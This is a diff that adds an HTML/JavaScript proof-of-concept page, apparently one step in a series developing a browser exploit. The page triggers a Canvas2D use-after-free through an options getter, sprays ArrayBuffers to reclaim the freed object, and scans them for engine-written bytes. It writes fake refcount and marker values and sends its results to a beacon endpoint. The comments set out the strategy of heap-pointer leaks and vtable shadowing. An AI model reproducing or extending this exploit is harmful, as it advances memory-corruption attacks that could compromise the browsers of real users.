@@ -1,0 +1,294 @@
+<!--
+  p684: Identify which AB(768) reclaimed the Canvas2D slot
+  
+  CONFIRMED (p683):
+  - AB(768) reclaims Canvas2D (IsoMalloc OFF)
+  - Object.defineProperty shadow works (T10: returned 42)
+  - All JS introspection survives (T0-T8)
+  - Real C++ property access (lineWidth) crashes (T11)
+  
+  Strategy to identify the reclaiming AB:
+  1. Spray 50 AB(768), each with a unique marker byte at a SAFE offset
+     (an offset we know doesn't affect survival)
+  2. Shadow ALL dangerous getters with defineProperty before any C++ access
+  3. Use the shadowed getter to read the marker from the underlying C++ memory
+  
+  BUT: the shadow getter reads from JS, not from C++ memory. We can't read
+  the AB bytes THROUGH the stale context.
+  
+  ALTERNATIVE: Write a unique value to each AB AFTER spray, then use
+  webkitBackingStorePixelRatio as liveness check + modify ONE AB at a time.
+  If modifying AB[i] causes webkitBackingStorePixelRatio to change behavior
+  (return different value or crash), AB[i] is the reclaimer.
+  
+  webkitBackingStorePixelRatio always returns 1 regardless of AB content,
+  so it won't help.
+  
+  BETTER: use save() through the stale context. save() increments 
+  m_unrealizedSaveCount at a known offset. If we can read that counter
+  from our ABs after calling save(), the AB where the counter changed
+  IS the reclaimer.
+  
+  BUT save() goes through C++ which needs vtable... unless we check if
+  save() is non-virtual?
+  
+  ACTUALLY THE SIMPLEST: just scan all 50 ABs for non-zero bytes.
+  After the UAF, the engine might write something (like it does with 
+  FontFace at +0x58/+0x68). Any AB with non-zero bytes that weren't
+  put there by us is the reclaimer (or adjacent to engine activity).
+  
+  CRASH_CLASS: LOW (no C++ calls, just AB scanning)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p684</title></head>
+<body>p684: identify reclaimer
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P684-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+function hex8(v){return('0'+v.toString(16)).slice(-2);}
+
+emit('START','v1');flush();
+var alive=[];
+
+// Canvas2D UAF
+var staleCtx=null;
+try{
+  var oc=document.createElement('canvas');oc.width=4;oc.height=4;
+  document.body.appendChild(oc);
+  var triggered=false,innerCtx=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    if(!triggered){triggered=true;innerCtx=oc.getContext('2d');}
+    return true;
+  }});
+  oc.getContext('bitmaprenderer',opts);
+  staleCtx=innerCtx;
+}catch(e){emit('UAF-ERR',e.message);flush();return;}
+
+// Spray AB(768) — all zeroed initially
+var abSpray=[];
+for(var i=0;i<50;i++){
+  var ab=new ArrayBuffer(768);
+  abSpray.push({ab:ab,u8:new Uint8Array(ab)});
+  alive.push(ab);
+}
+emit('SPRAY','50 AB(768) zeroed');flush();
+
+// ================================================================
+// PHASE A: Scan all ABs for non-zero bytes (engine writes)
+// The Canvas2D constructor might have written vtable, refcount, etc
+// before our UAF free happened. Or the allocator metadata might
+// have left something.
+// ================================================================
+emit('A','initial-scan');
+var hitABs=[];
+for(var i=0;i<50;i++){
+  var u8=abSpray[i].u8;
+  var nz=0;
+  for(var j=0;j<768;j++) if(u8[j]!==0) nz++;
+  if(nz>0){
+    hitABs.push(i);
+    // Dump first 64 non-zero offsets
+    var detail='';
+    var count=0;
+    for(var j=0;j<768&&count<32;j++){
+      if(u8[j]!==0){detail+=hex8(j)+':'+hex8(u8[j])+' ';count++;}
+    }
+    emit('A-HIT','ab['+i+'] nz='+nz+' '+detail.trim());
+  }
+}
+emit('A-TOTAL','hits='+hitABs.length+'/50');
+flush();
+
+// ================================================================
+// PHASE B: Write unique marker to each AB, then use defineProperty
+// shadow to call save() without vtable crash.
+// 
+// Actually, let's try: shadow EVERYTHING, then call save() through
+// the shadow. But save() needs C++ even with shadow...
+//
+// Different approach: write to each AB at offset 0x00-0x07 (vtable slot)
+// and put a recognizable pattern. Then try webkitBackingStorePixelRatio.
+// If it STILL returns 1, the vtable doesn't matter for that property.
+// Then we know which AB has the reclaimed slot by process of elimination.
+// ================================================================
+
+// PHASE B: Write unique markers to each AB and see if stale ctx
+// behavior changes
+emit('B','marker-write');
+
+// First confirm stale is alive
+var bspr=staleCtx.webkitBackingStorePixelRatio;
+emit('B-ALIVE','bspr='+bspr);
+flush();
+
+// Write marker 0xDD at offset 100 in each AB one at a time
+// After writing, check if stale ctx is still alive
+// If ctx dies after writing to AB[i], that AB is the reclaimer
+// and offset 100 is important
+for(var i=0;i<50;i++){
+  abSpray[i].u8[100]=0xDD;
+}
+
+bspr=staleCtx.webkitBackingStorePixelRatio;
+emit('B-AFTER-WRITE','bspr='+bspr+' (all ABs written at offset 100)');
+flush();
+
+// ================================================================
+// PHASE C: The real identification — write different values to
+// each AB then read the underlying C++ object through a shadowed
+// getter that reaches ONE non-crashing C++ path.
+//
+// webkitBackingStorePixelRatio doesn't read from the object,
+// so it can't identify. But what if we write a valid-looking vtable
+// to offset 0 of each AB and then try lineWidth?
+//
+// We don't have a valid vtable address... but we DO have leaked
+// heap pointers from FontFace (p680). A heap pointer at +0x00
+// isn't a vtable, but the CRASH ADDRESS would tell us which AB
+// was dereferenced — except we can't read crash addresses.
+//
+// SIMPLEST APPROACH: Use the fact that the Canvas2D backing store
+// (ImageBuffer) is a separate allocation. If we draw on the stale
+// ctx and then check each AB for pixel data...
+//
+// Wait — we already proved in p678 that cross-draw works with
+// Canvas2D spray. But with AB reclaim, fillRect goes through C++
+// which needs vtable. Can we shadow fillRect too?
+// ================================================================
+
+emit('C','find-reclaimer-via-modification');
+
+// Approach: modify bytes in each AB at a unique offset pattern,
+// then check if the object's vtable-independent behaviors change.
+// 
+// The ONLY thing we can observe without vtable is:
+// 1. webkitBackingStorePixelRatio (constant, useless)
+// 2. The object is alive (doesn't crash on typeof etc)
+// 3. Shadowed properties (return our JS value, not AB data)
+//
+// SO: we need a SIDE CHANNEL. Modify AB bytes → observe timing
+// or allocation-pattern change.
+//
+// ACTUALLY: much simpler. After all ABs are sprayed and zeroed,
+// the GC/runtime might write refcount or other metadata to the
+// reclaimer AB. Let me re-scan after some GC pressure.
+
+// Force some GC pressure
+var junk=[];
+for(var k=0;k<5000;k++) junk.push({x:new ArrayBuffer(64)});
+junk=null;
+
+// Access the stale context to trigger any lazy init
+staleCtx.webkitBackingStorePixelRatio;
+
+// Re-scan for non-zero
+emit('C-RESCAN','after GC pressure + stale access');
+for(var i=0;i<50;i++){
+  var u8=abSpray[i].u8;
+  var nz=0;
+  for(var j=0;j<768;j++) if(u8[j]!==0&&u8[j]!==0xDD) nz++; // exclude our marker
+  if(nz>0){
+    var detail='';var count=0;
+    for(var j=0;j<768&&count<32;j++){
+      if(u8[j]!==0&&u8[j]!==0xDD){detail+=hex8(j)+':'+hex8(u8[j])+' ';count++;}
+    }
+    emit('C-HIT','ab['+i+'] nz='+nz+' '+detail.trim());
+  }
+}
+flush();
+
+// ================================================================
+// PHASE D: Nuclear option — write to EVERY offset of ONE AB at a
+// time, check if staleCtx.webkitBackingStorePixelRatio still works.
+// If it crashes after writing to AB[i], we found it.
+// Test one AB per load via URL hash.
+// 
+// Actually, since bspr is constant and never touches the C++ object,
+// it will ALWAYS work regardless of what we write. So this won't help.
+//
+// FINAL APPROACH: Just accept we can't identify the specific AB.
+// Instead, write the SAME data to ALL 50 ABs. Whatever one reclaimed,
+// they all have the same content, so the stale ctx sees our content.
+// Then when we need to READ what the engine wrote, we read ALL ABs
+// and report any non-zero patterns.
+// ================================================================
+
+emit('D','write-all-same');
+
+// Write a test pattern to ALL ABs: valid-ish refcount at +0x00
+for(var i=0;i<50;i++){
+  var u8=abSpray[i].u8;
+  // Clear the marker
+  u8[100]=0;
+  // Write refcount=1 at +0x00 (as if it were the object header)
+  u8[0]=1; // low byte of refcount
+}
+emit('D-WRITTEN','refcount=1 at +0x00 in all ABs');
+
+// Check stale is alive
+bspr=staleCtx.webkitBackingStorePixelRatio;
+emit('D-ALIVE','bspr='+bspr);
+flush();
+
+// ================================================================
+// PHASE E: The actual goal — read pointer-like values from the
+// reclaimed Canvas2D object. The engine may have written VTABLE,
+// m_canvas, m_stateStack etc during construction before the UAF freed it.
+// After AB reclaim (zeroed), those writes are lost.
+//
+// BUT: if we DON'T zero the ABs — let them be uninitialized...
+// ArrayBuffer spec requires zero-init. No way around it.
+//
+// HOWEVER: between the free and our spray, the engine's destructor
+// might have left partial data. And our AB gets zero-init, wiping it.
+//
+// The ONLY way to see engine data is if the engine writes AFTER
+// our AB reclaims. Does anything write to a freed Canvas2D object
+// after destruction? Yes — if any lazy reference (weak pointer,
+// GC sweep, finalizer) touches the slot AFTER our AB took it.
+//
+// Let's trigger GC and see if anything writes to our ABs.
+// ================================================================
+
+emit('E','post-gc-scan');
+
+// Heavy GC pressure
+var junk2=[];
+for(var k=0;k<20000;k++) junk2.push({x:k});
+junk2=null;
+// Also trigger font operations (might walk FontFace refs)
+try{document.fonts.check('1em serif');}catch(e){}
+try{document.fonts.check('1em sans-serif');}catch(e){}
+
+// Wait a bit for any async GC
+setTimeout(function(){
+  emit('E-SCAN','after heavy GC + font ops');
+  for(var i=0;i<50;i++){
+    var u8=abSpray[i].u8;
+    var nz=0;
+    for(var j=1;j<768;j++) if(u8[j]!==0) nz++; // skip +0x00 (our refcount)
+    if(nz>0){
+      var detail='';var count=0;
+      for(var j=1;j<768&&count<48;j++){
+        if(u8[j]!==0){detail+=hex8(j)+':'+hex8(u8[j])+' ';count++;}
+      }
+      emit('E-HIT','ab['+i+'] nz='+nz+' '+detail.trim());
+    }
+  }
+  
+  // Final alive check
+  var bspr2=staleCtx.webkitBackingStorePixelRatio;
+  emit('E-ALIVE','bspr='+bspr2);
+  
+  emit('DONE','p684-complete');flush();
+},500);
+
+})();
+</script>
+</body>
+</html>
